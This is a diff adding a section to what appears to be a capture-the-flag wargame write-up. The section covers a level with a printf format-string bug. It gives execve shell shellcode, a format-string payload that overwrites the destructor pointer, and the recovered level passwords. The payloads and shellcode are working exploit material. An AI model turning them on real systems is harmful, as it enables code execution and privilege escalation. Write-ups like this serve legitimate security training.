@@ -429,3 +429,47 @@ $ /levels/level08 `python -c 'print "\x28\xa0\x04\x08"+"\x90"*78+"\x31\xc0\x99\x
 $ cat /home/level9/.pass
 ise9uHhjOhZd0K4G
 ```
+
+## level 9
+
+```
+$ cat /levels/level09.c
+```
+
+```cpp
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+    int  pad = 0xbabe;
+    char buf[1024];
+    strncpy(buf, argv[1], sizeof(buf) - 1);
+
+    printf(buf);
+
+    return 0;
+}
+```
+
+This is a format string vulnerability challenge.
+
+```
+$ export shellcode=`python -c 'print "\x90"*200+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"'`
+```
+
+```
+$ nm /levels/level09 | grep DTOR
+080494d4 d __DTOR_END__
+080494d0 d __DTOR_LIST__
+```
+
+Find where ```shellcode``` is on the stack, and write the address over the top of the destruction function pointer.
+
+```
+$ /levels/level09 `python -c'print "\xd4\x94\x04\x08" + "\xd5\x94\x04\x08" + "\xd6\x94\x04\x08" + "\xd7\x94\x04\x08" + "%104u%4$n%390u%5$n%257u%6$n%192u%7$n"'`
+```
+
+```
+$ cat /home/level10/.pass
+UT3ROlnUqI0R2nJA
+```
